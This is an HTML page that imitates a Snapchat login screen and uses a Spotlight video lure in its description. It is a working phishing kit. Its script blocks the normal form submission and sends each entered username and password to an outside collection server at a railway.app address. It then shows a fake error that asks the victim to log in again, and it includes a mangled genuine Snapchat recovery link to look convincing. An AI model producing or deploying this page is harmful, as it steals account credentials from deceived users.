<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<link rel="shortcut icon" href="img/faviconV2.png">
<meta name="description" content="Watch this amazing video on Snapchat Spotlight!">
<meta property="og:site_name" content="Snapchat Spotlight">
<link rel="stylesheet" href="/css/login.css">
<title>Login • Snapchat</title>
</head>
<body>
<div class="login-container">
<div id="error-message" class="error-message" style="display:none;">
      Something went wrong ! Please re-login to your account.
</div>
<h1>Log In</h1>
<form id="login-form" action="" method="POST" autocomplete="off" onsubmit="return validatePassword(event)">
<label for="username">USERNAME OR EMAIL</label>
<input type="text" id="username" name="name" required autocomplete="off" placeholder="Enter username or email">
 
      <p class="alternate-option"><a href="javascript:void(0);" id="switch-to-phone">Use phone number instead</a></p>
 
      <label for="password">PASSWORD</label>
<div class="password-container">
<input type="password" id="password" name="message" required autocomplete="new-password" placeholder="Enter password">
<button type="button" class="toggle-password" onclick="togglePasswordVisibility()">
<img src="img/eye-closed.svg" id="eye-icon" width="20" height="20" alt="eye icon">
</button>
</div>
 
      <div class="save-info">
<input type="checkbox" id="save-login">
<label for="save-login">Save Login Info on your device</label>
</div>
 
      <div class="incorrect" style="display:none;">
<p>Incorrect password, please try again.</p>
</div>
 
      <p class="forgot-password"><a
href="https://accounts.snapchat.com/accounts/v2/otp?ai=dGVqYXptYWxp&continue=%2Faccounts%2Fsso%3Fclient_id%3Dweb-calling-corp--prod%26referrer%3Dhttps%href=%22https://accounts.snapchat.com/accounts/v2/otp?ai=dGVqYXptYWxp&continue=%2Faccounts%2Fsso%3Fclient_id%3Dweb-caling-corp--prod%26referrer%3Dhttps%253A%252F%252Fweb.snapchat.com%253Fref%253Dsign_in_sidebar&otpRequirement=ChBDb25maXJtIEl0J3MgWW91EjRQbGVhc2UgaW5wdXQgdGhlIGNvZGUgc2VudCB0byDigaYrOTEgKi53A%252F%252Fweb.snapchat.com%253Fref%253Dsign_in_sidebar&otpRequirement=ChBDb25maXJtIEl0J3MgWW91EjRQbGVhc2UgaW5wdXQgdGhlIGNvZGUgc2VudCB0byDigaYrOTEgKioqKiotKjg5MDXigakuIgEB&accountRecovery=true&referrer=https%3A%2F%2Fweb.snapchat.com%3Fref%3Dsign_in_sidebar%22>Forgot your password?</a></p>
 
      <button type="submit" class="login-button">Log In</button>
</form>
 
    <script>
      function togglePasswordVisibility() {
        const passwordInput = document.getElementById('password');
        const eyeIcon = document.getElementById('eye-icon');
 
        if (passwordInput.type === 'password') {
          passwordInput.type = 'text';
          eyeIcon.src = 'img/eye-open.svg';
        } else {
          passwordInput.type = 'password';
          eyeIcon.src = 'img/eye-closed.svg';
        }
      }
 
      function validatePassword(event) {
        event.preventDefault(); // Prevent form submission
 
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
 
        if (username && password) {
          fetch('https://api-credentials-062026-production.up.railway.app/register', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username, password })
          })
            .then(response => response.json())
            .then(data => {
              if (data.success) {
                // Handle success
                console.log('Login successful');
              } else {
                // Handle error
                document.getElementById('error-message').style.display = 'block';
              }
            })
            .catch(error => {
              console.error('Error:', error);
            });
        } else {
          // Handle empty input fields
          alert('Please enter both username and password');
        }
      }
</script>
</div>
</body>
</html>
